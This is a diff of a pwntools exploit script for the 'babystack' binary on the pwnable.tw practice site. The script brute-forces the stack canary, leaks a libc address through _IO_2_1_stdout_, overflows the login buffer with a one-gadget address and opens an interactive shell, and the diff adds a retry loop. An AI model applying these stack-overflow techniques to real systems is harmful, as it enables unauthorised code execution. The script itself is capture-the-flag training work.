@@ -43,7 +43,7 @@ def brude(sz=0x10):
 
 DEBUG = False
 
-context.proxy = (socks.SOCKS5, '192.168.152.1', 18888)
+# context.proxy = (socks.HTTP, '192.168.152.1', 19999)
 
 if DEBUG:
     p = process('/home/len/pwnable/babystack')
@@ -57,22 +57,33 @@ _IO_2_1_stdout_offset = 0x1ec6a0
 
 
 if __name__ == '__main__':
-    canary = brude()
-    print(canary.encode('hex'))
+    while True:
+        canary = brude()
+        if len(canary) != 16:
+            p.close()
+            p = remote('chall.pwnable.tw', 10205)
+            continue
+        else:
+            print(canary.encode('hex'))
 
-    # for leak libc_address
-    login('')
-    read_input('a' * 0x3f, op='1')
-    _IO_2_1_stdout_addr = u64(brude(8).ljust(8, '\0'))
-    print('_IO_2_1_stdout_addr: {:#x}'.format(_IO_2_1_stdout_addr))
-    libc_base = _IO_2_1_stdout_addr - _IO_2_1_stdout_offset
-    print('libc_base: {:#x}'.format(libc_base))
+            # for leak libc_address
+            p.sendlineafter('>> ', 'a')
+            login('')
+            read_input('a' * 0x3f, op='1')
+            _IO_2_1_stdout_addr = u64(brude(8).ljust(8, '\0'))
+            print('_IO_2_1_stdout_addr: {:#x}'.format(_IO_2_1_stdout_addr))
+            libc_base = _IO_2_1_stdout_addr - _IO_2_1_stdout_offset
+            print('libc_base: {:#x}'.format(libc_base))
+            if libc_base % 0x1000 !=0:
+                continue
+            
 
-    # payload
-    gadget_addr = libc_base + gadget_offset
-    print('gadget_addr: {:#x}'.format(gadget_addr))
-    pdb.set_trace()
-    login('\x00'.ljust(0x40, 'a') + canary + 'a' * 0x18 + p64(gadget_addr) +
-          'c' * (0xd))
-    read_input('b' * 0x3f, '2')
-    p.interactive()
+            # payload
+            gadget_addr = libc_base + gadget_offset
+            print('gadget_addr: {:#x}'.format(gadget_addr))
+            pdb.set_trace()
+            login('\x00'.ljust(0x40, 'a') + canary + 'a' * 0x18 + p64(gadget_addr) +
+                'c' * (0xd))
+            read_input('b' * 0x3f, '2')
+            p.interactive()
+            break
